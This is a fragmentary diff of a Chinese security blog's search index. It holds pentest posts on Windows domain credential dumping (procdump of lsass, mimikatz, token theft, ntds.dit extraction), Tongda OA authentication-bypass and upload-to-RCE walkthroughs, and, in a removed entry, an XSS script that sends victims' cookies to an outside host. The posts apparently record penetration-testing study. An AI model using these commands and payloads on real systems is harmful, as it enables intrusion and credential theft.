     <content><![CDATA[<p>为弘扬中华民族美德-勤俭持家，利用闲暇时间将手中的oneplus 5变废为宝。<br>Kali Linux NetHunter是一个开源的Android渗透测试平台，它可以轻松的使用各种安全工具，详情介绍请查阅官方网站。<br><font color=green>本文章基于oneplus 5手机，其它手机型号方法类似；各项基础知识不在文章赘述范围之内，自行了解；所需全部文件在末尾链接出，下面进入干货环节。</font><span id="more"></span><br><font color=red><strong>数据无价，任何操作前请确认数据已备份</strong>！！！</font></p>
@@ -1456,7 +1468,7 @@
 <p><strong>2、nltest信任域</strong></p>
 <p>查询域间的信任关系<br><code>nettles  /domain_trusts /all_trusts /v /server:192.168.52.2</code><br>返回所有信任192.168.52.2的域</p>
 <p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code><br>返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p>
-<p>nltest的命令：<br><a href="https://www.cnblogs.com/dreamer-fish/p/3473895.html">https://www.cnblogs.com/dreamer-fish/p/3473895.html</a></p>
+<p>nltest的命令：<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZHJlYW1lci1maXNoL3AvMzQ3Mzg5NS5odG1s">https://www.cnblogs.com/dreamer-fish/p/3473895.html<i class="fa fa-external-link-alt"></i></span></p>
 <p><strong>3、nbtscan.exe</strong></p>
 <p>扫描网段内是否存在域内机器</p>
 <p><code>nbtscan.exe 192.168.52.0/24</code></p>
@@ -1477,7 +1489,7 @@
 <h4 id="2-2、lsass进程读取内存hash"><a href="#2-2、lsass进程读取内存hash" class="headerlink" title="2.2、lsass进程读取内存hash"></a>2.2、lsass进程读取内存hash</h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p>
 <p>​    <strong>1、目标机执行procdump.exe</strong><br><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p>
 <p>​    <strong>2、mimikatz中运行,结果保存在日志里</strong><br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
-<h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+<h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmU=">https://github.com/AlessandroZ/LaZagne<i class="fa fa-external-link-alt"></i></span></p>
 <h4 id="2-4、凭证窃取"><a href="#2-4、凭证窃取" class="headerlink" title="2.4、凭证窃取"></a>2.4、凭证窃取</h4><p>通过tasklist &#x2F;v查看进程用户，如果有域用户开启的进程，则窃取凭证</p>
 <p><code>incognito.exe list_tokens -u</code>  查看目标机当前存储那些凭证<br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code>  使用域用户administrator凭证开启一个cmd</p>
 <h4 id="2-5、命令行渗透-IPC连接"><a href="#2-5、命令行渗透-IPC连接" class="headerlink" title="2.5、命令行渗透-IPC连接"></a>2.5、命令行渗透-IPC连接</h4><p>为什么命令后渗透？？<br>1、远程登录桌面增加暴漏风险<br>2、目标管理员可能对服务器禁用远程登录</p>
@@ -1539,7 +1551,7 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NetGroupGetUsers.exe &quot;domain users&quot; \\192.168.52.2</span><br><span class="line">NetLocalGroupGetMembers.exe \\192.168.52.2</span><br><span class="line">NetUserEnum.exe \\192.168.52.2</span><br></pre></td></tr></table></figure>
 
 <h3 id="四、导域HASH"><a href="#四、导域HASH" class="headerlink" title="四、导域HASH"></a>四、导域HASH</h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p>
-<p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx">官方文档</a>，首先我们要创建一个快照：</p>
+<p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvZ2cyOTQwNzQuYXNweA==">官方文档<i class="fa fa-external-link-alt"></i></span>，首先我们要创建一个快照：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; creat quit quit</span><br></pre></td></tr></table></figure>
 
 <p>接下来我们挂载快照：</p>
@@ -1587,18 +1599,6 @@
       <tags>
         <tag>Cryptography</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>简易xss平台 获取Cookie</title>
-    <url>/2020/xss%E8%8E%B7%E5%8F%96.html</url>
-    <content><![CDATA[<p>1、启用python http服务器</p>
-<img src="../images/upload/python3.png" style="zoom:67%;" />
-
-<p>2、在有xss的地方插入截获代码</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://192.168.56.109/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>3、等待管理员触发漏洞后，便会截获到cookie</p>
-<img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
   </entry>
   <entry>
     <title>常见反向shell方法</title>
@@ -1699,12 +1699,102 @@
 <p>2.获取sessionID<br>post  &#x2F;logincheck_code.php</p>
 <p><img src="/../images/upload/sessid.jpg" alt="example"></p>
 <p><a href="../file/sessionID.txt">requests.txt</a></p>
-<p>3.实现登录<br>访问<a href="http://xxxx.com/general/index.php">http://xxxx.com/general/index.php</a> 利用上一步得到的cookies，<br>通过小饼干🍪等工具替换cookie，刷新页面即可成功进入</p>
+<p>3.实现登录<br>访问<span class="exturl" data-url="aHR0cDovL3h4eHguY29tL2dlbmVyYWwvaW5kZXgucGhw">http://xxxx.com/general/index.php<i class="fa fa-external-link-alt"></i></span> 利用上一步得到的cookies，<br>通过小饼干🍪等工具替换cookie，刷新页面即可成功进入</p>
 <p><img src="/../images/upload/admin1.png" alt="example"></p>
-<h3 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h3><p><a href="https://github.com/NS-Sp4ce/TongDaOA-FaKe-User">https://github.com/NS-Sp4ce/TongDaOA-FaKe-User</a></p>
+<h3 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05TLVNwNGNlL1RvbmdEYU9BLUZhS2UtVXNlcg==">https://github.com/NS-Sp4ce/TongDaOA-FaKe-User<i class="fa fa-external-link-alt"></i></span></p>
 <p>利用POC测试站点，若存在漏洞，返回cookie；利用cookie便可直接登录</p>
 <p><img src="/../images/upload/poc1.png" alt="poc_result"></p>
-<h3 id="0x04-关键词"><a href="#0x04-关键词" class="headerlink" title="0x04 关键词"></a>0x04 关键词</h3><p><a href="https://zoomeye.org/">https://zoomeye.org</a> 中搜索<code>app:&quot;Tongda office anywhere httpd&quot;</code></p>
+<h3 id="0x04-关键词"><a href="#0x04-关键词" class="headerlink" title="0x04 关键词"></a>0x04 关键词</h3><p><span class="exturl" data-url="aHR0cHM6Ly96b29tZXllLm9yZy8=">https://zoomeye.org<i class="fa fa-external-link-alt"></i></span> 中搜索<code>app:&quot;Tongda office anywhere httpd&quot;</code></p>
+]]></content>
+      <categories>
+        <category>通达OA</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通达OA 任意文件上传/文件包含GetShell</title>
+    <url>/2020/%E9%80%9A%E8%BE%BEOA2.html</url>
+    <content><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。<br>影响版本包含：<br>文件上传：<br><code>V11版 &lt;= 11.3    20200103  2017版 &lt;= 10.19  20190522  2016版 &lt;= 9.13   20170710  2015版 &lt;= 8.15   20160722  2013增强版 &lt;=7.25 20141211  2013版 &lt;= 6.20   20141017</code><span id="more"></span></p>
+<p>文件包含：</p>
+<p><code>V11版 &lt;= 11.3</code></p>
+<h3 id="0x02-解密工具"><a href="#0x02-解密工具" class="headerlink" title="0x02 解密工具"></a>0x02 解密工具</h3><p>代码通过Zend加密处理，需对进行解密操作后获得可读性源码</p>
+<ul>
+<li>离线解密：<code>链接: https://pan.baidu.com/s/1MHtt3KXVIZAALzZmzTUJeg 密码: tadp</code></li>
+<li>在线解密：<code>http://dezend.qiling.org/free.html</code></li>
+</ul>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vT0EtdG9uZ2RhLVJDRS90cmVlL21hc3Rlci90b25nZGEvZGVjb2Rl">解密后的部分代码<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h3><ul>
+<li>漏洞主要两个原因，文件上传、文件包含</li>
+</ul>
+<p><strong>文件上传</strong></p>
+<p>ispirit&#x2F;im&#x2F;upload.php<br>要上传先要绕过登录认证，但在upload.php修复前，如果变量<code>$P</code>非空则不经过auth.php验证即可执行后续代码</p>
+<p><img src="/../images/upload/comper.png" alt="代码对比"></p>
+<p>上传后的文件不在根目录，所以无法直接利用，需结合文件包含</p>
+<p><strong>文件包含</strong></p>
+<p>ispirit&#x2F;interface&#x2F;gateway.php<br>这里问题在于可以构造json，使其执行<code>include_once</code>代码</p>
+<p><img src="/../images/upload/sour.png" alt="include"></p>
+<h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h3><p>1.上传文件请求</p>
+<p><img src="/../images/upload/upim.jpg" alt="upload"></p>
+<p><a href="../file/upload.txt">命令执行request.txt</a>    <a href="../file/getshell.txt">GetWebshell request.txt</a></p>
+<p>2.包含文件执行命令</p>
+<p><img src="/../images/upload/exec.jpg" alt="exec"></p>
+<p><a href="../file/exec.txt">执行命令 request.txt</a></p>
+<h3 id="0x05-异常处理"><a href="#0x05-异常处理" class="headerlink" title="0x05 异常处理"></a>0x05 异常处理</h3><ul>
+<li><strong>版本路径</strong>：</li>
+</ul>
+<p>有些版本gateway.php路径不同</p>
+<p>例如2013：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>例如2017：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/mac/gateway.php</span><br><span class="line"></span><br><span class="line">C:\MYOA&gt;dir /s /b gateway.php</span><br><span class="line">C:\MYOA\webroot\mac\gateway.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>上传后无回显：</strong></li>
+</ul>
+<p><img src="/../images/upload/noecho.png" alt="noecho"></p>
+<p>部分网站无上传回显，把UPLOAD_MODE参数的值改为1就可以正常拿到上传后的文件名了。</p>
+<p><img src="/../images/upload/noecho2.png" alt="noecho2"></p>
+<ul>
+<li><strong>为什么你没成功：</strong></li>
+</ul>
+<p>我试了许多版本，发现返回<code>2005_xxxxxx</code>的都不能成功，网上复现利用成功的都是<code>2003_xxxxxx</code><br>不知道怎么搞</p>
+<hr>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vT0EtdG9uZ2RhLVJDRQ==">参考链接🔗<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
+      <categories>
+        <category>通达OA</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通达OA 后台GetShell</title>
+    <url>/2020/%E9%80%9A%E8%BE%BEOA3.html</url>
+    <content><![CDATA[<h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
+<p><img src="/../images/upload/loginadmin.png" alt="login"></p>
+<span id="more"></span>
+
+<h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p>
+<p><img src="/../images/upload/fujian.png" alt="fujian"></p>
+<p>此站点并未设置存储目录，点击添加目录</p>
+<p><img src="/../images/upload/fujian2.png" alt="fujian"></p>
+<p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p>
+<p><img src="/../images/upload/fujian3.png" alt="gujian3"></p>
+<p><img src="/../images/upload/fujian4.png" alt="fujian4"></p>
+<p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p>
+<p><img src="/../images/upload/fujian5.png" alt="fujian5"></p>
+<h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p>
+<p><img src="/../images/upload/fujian6.png" alt="fujian6"></p>
+<p><img src="/../images/upload/oa31.png" alt="oa31"></p>
+<p><a href="../file/upshell.txt">上传附件 request.txt</a></p>
+<p><img src="/../images/upload/oa3.png" alt="oa3"></p>
+<p><img src="/../images/upload/oa32.png" alt="oa32"></p>
+<p><img src="/../images/upload/oa33.png" alt="oa33"></p>
+<p><img src="/../images/upload/oa34.png" alt="oa34"></p>
 ]]></content>
       <categories>
         <category>通达OA</category>
@@ -1751,96 +1841,6 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通达OA 后台GetShell</title>
-    <url>/2020/%E9%80%9A%E8%BE%BEOA3.html</url>
-    <content><![CDATA[<h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
-<p><img src="/../images/upload/loginadmin.png" alt="login"></p>
-<span id="more"></span>
-
-<h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p>
-<p><img src="/../images/upload/fujian.png" alt="fujian"></p>
-<p>此站点并未设置存储目录，点击添加目录</p>
-<p><img src="/../images/upload/fujian2.png" alt="fujian"></p>
-<p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p>
-<p><img src="/../images/upload/fujian3.png" alt="gujian3"></p>
-<p><img src="/../images/upload/fujian4.png" alt="fujian4"></p>
-<p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p>
-<p><img src="/../images/upload/fujian5.png" alt="fujian5"></p>
-<h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p>
-<p><img src="/../images/upload/fujian6.png" alt="fujian6"></p>
-<p><img src="/../images/upload/oa31.png" alt="oa31"></p>
-<p><a href="../file/upshell.txt">上传附件 request.txt</a></p>
-<p><img src="/../images/upload/oa3.png" alt="oa3"></p>
-<p><img src="/../images/upload/oa32.png" alt="oa32"></p>
-<p><img src="/../images/upload/oa33.png" alt="oa33"></p>
-<p><img src="/../images/upload/oa34.png" alt="oa34"></p>
-]]></content>
-      <categories>
-        <category>通达OA</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通达OA 任意文件上传/文件包含GetShell</title>
-    <url>/2020/%E9%80%9A%E8%BE%BEOA2.html</url>
-    <content><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。<br>影响版本包含：<br>文件上传：<br><code>V11版 &lt;= 11.3    20200103  2017版 &lt;= 10.19  20190522  2016版 &lt;= 9.13   20170710  2015版 &lt;= 8.15   20160722  2013增强版 &lt;=7.25 20141211  2013版 &lt;= 6.20   20141017</code><span id="more"></span></p>
-<p>文件包含：</p>
-<p><code>V11版 &lt;= 11.3</code></p>
-<h3 id="0x02-解密工具"><a href="#0x02-解密工具" class="headerlink" title="0x02 解密工具"></a>0x02 解密工具</h3><p>代码通过Zend加密处理，需对进行解密操作后获得可读性源码</p>
-<ul>
-<li>离线解密：<code>链接: https://pan.baidu.com/s/1MHtt3KXVIZAALzZmzTUJeg 密码: tadp</code></li>
-<li>在线解密：<code>http://dezend.qiling.org/free.html</code></li>
-</ul>
-<p><a href="https://github.com/jas502n/OA-tongda-RCE/tree/master/tongda/decode">解密后的部分代码</a></p>
-<h3 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h3><ul>
-<li>漏洞主要两个原因，文件上传、文件包含</li>
-</ul>
-<p><strong>文件上传</strong></p>
-<p>ispirit&#x2F;im&#x2F;upload.php<br>要上传先要绕过登录认证，但在upload.php修复前，如果变量<code>$P</code>非空则不经过auth.php验证即可执行后续代码</p>
-<p><img src="/../images/upload/comper.png" alt="代码对比"></p>
-<p>上传后的文件不在根目录，所以无法直接利用，需结合文件包含</p>
-<p><strong>文件包含</strong></p>
-<p>ispirit&#x2F;interface&#x2F;gateway.php<br>这里问题在于可以构造json，使其执行<code>include_once</code>代码</p>
-<p><img src="/../images/upload/sour.png" alt="include"></p>
-<h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h3><p>1.上传文件请求</p>
-<p><img src="/../images/upload/upim.jpg" alt="upload"></p>
-<p><a href="../file/upload.txt">命令执行request.txt</a>    <a href="../file/getshell.txt">GetWebshell request.txt</a></p>
-<p>2.包含文件执行命令</p>
-<p><img src="/../images/upload/exec.jpg" alt="exec"></p>
-<p><a href="../file/exec.txt">执行命令 request.txt</a></p>
-<h3 id="0x05-异常处理"><a href="#0x05-异常处理" class="headerlink" title="0x05 异常处理"></a>0x05 异常处理</h3><ul>
-<li><strong>版本路径</strong>：</li>
-</ul>
-<p>有些版本gateway.php路径不同</p>
-<p>例如2013：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure>
-
-<p><strong>例如2017：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/mac/gateway.php</span><br><span class="line"></span><br><span class="line">C:\MYOA&gt;dir /s /b gateway.php</span><br><span class="line">C:\MYOA\webroot\mac\gateway.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>上传后无回显：</strong></li>
-</ul>
-<p><img src="/../images/upload/noecho.png" alt="noecho"></p>
-<p>部分网站无上传回显，把UPLOAD_MODE参数的值改为1就可以正常拿到上传后的文件名了。</p>
-<p><img src="/../images/upload/noecho2.png" alt="noecho2"></p>
-<ul>
-<li><strong>为什么你没成功：</strong></li>
-</ul>
-<p>我试了许多版本，发现返回<code>2005_xxxxxx</code>的都不能成功，网上复现利用成功的都是<code>2003_xxxxxx</code><br>不知道怎么搞</p>
-<hr>
-<p><a href="https://github.com/jas502n/OA-tongda-RCE">参考链接🔗</a></p>
-]]></content>
-      <categories>
-        <category>通达OA</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
 </search>
